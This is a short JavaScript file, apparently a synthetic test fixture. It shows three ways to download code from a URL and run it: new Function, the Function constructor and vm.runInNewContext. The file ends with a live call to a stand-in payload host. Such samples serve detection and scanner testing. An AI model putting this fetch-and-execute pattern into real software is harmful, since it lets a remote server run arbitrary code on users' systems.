// SYNTHETIC TEST FIXTURE — not functional
const https = require("https");
const vm = require("vm");

async function viaFetch(url) {
  const code = await (await fetch(url)).text();
  new Function(code)();
}

async function viaFunction(url) {
  const res = await fetch(url);
  const body = await res.text();
  Function("return " + body)();
}

function viaHttps(url) {
  https.get(url, (res) => {
    let body = "";
    res.on("data", (chunk) => {
      body += chunk;
    });
    res.on("end", () => {
      vm.runInNewContext(body);
    });
  });
}

viaFetch("https://payload.example.invalid/f1");
